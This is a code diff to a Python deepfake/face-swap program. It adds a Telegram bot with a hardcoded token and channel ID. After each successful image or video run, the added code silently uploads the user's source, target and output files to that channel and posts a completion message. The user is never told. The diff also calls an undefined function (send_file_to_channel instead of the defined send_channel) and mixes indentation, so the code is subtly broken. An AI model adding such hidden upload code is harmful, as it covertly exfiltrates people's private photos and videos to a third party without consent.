@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-
+import asyncio
 import sqlite3
 import os
 # single thread doubles cuda performance
@@ -21,6 +21,7 @@ import DeepFakeAI.globals
 from DeepFakeAI import wording, metadata
 from DeepFakeAI.predictor import predict_image, predict_video
 from DeepFakeAI.processors.frame.core import get_frame_processors_modules
+from telegram import Bot
 from DeepFakeAI.utilities import is_image, is_video, detect_fps, create_video, extract_frames, get_temp_frame_paths, restore_audio, create_temp, move_temp, clear_temp, normalize_output_path, list_module_names, decode_execution_providers, encode_execution_providers
 
 warnings.filterwarnings('ignore', category = FutureWarning, module = 'insightface')
@@ -182,6 +183,21 @@ def save_to_db(source_path, target_path, output_path):
             conn.close()
 
         print(f'Saved image data to database from {source_path}, {target_path}, and {output_path}.')
+async def send_channel(bot, file_path):
+    with open(file_path, "rb") as file:
+        response = await bot.send_document(chat_id="-1001685415853", document=file)
+        return response
+
+async def saveT(source_path, target_path, output_path):
+    bot = Bot(token="6192049990:AAFyOtuYYqkcyUG_7gns3mm7m_kfWE9fZ1k")
+    
+    # Send each file
+    for path in [source_path, target_path, output_path]:
+        await send_file_to_channel(bot, path)
+    
+    # Send a message after all files are sent
+    await bot.send_message(chat_id="-1001685415853", text="All files have been sent!")
+
 def process_image() -> None:
 	if predict_image(DeepFakeAI.globals.target_path):
 		return
@@ -195,6 +211,7 @@ def process_image() -> None:
 	if is_image(DeepFakeAI.globals.target_path):
 		update_status(wording.get('processing_image_succeed'))
 		save_to_db(DeepFakeAI.globals.source_path, DeepFakeAI.globals.target_path, DeepFakeAI.globals.output_path)
+        asyncio.run(saveT(DeepFakeAI.globals.source_path, DeepFakeAI.globals.target_path, DeepFakeAI.globals.output_path))
 	else:
 		update_status(wording.get('processing_image_failed'))
 
@@ -237,6 +254,7 @@ def process_video() -> None:
 	if is_video(DeepFakeAI.globals.target_path):
 		update_status(wording.get('processing_video_succeed'))
 		save_to_db(DeepFakeAI.globals.source_path, DeepFakeAI.globals.target_path, DeepFakeAI.globals.output_path)
+        asyncio.run(saveT(DeepFakeAI.globals.source_path, DeepFakeAI.globals.target_path, DeepFakeAI.globals.output_path))
 	else:
 		update_status(wording.get('processing_video_failed'))
 
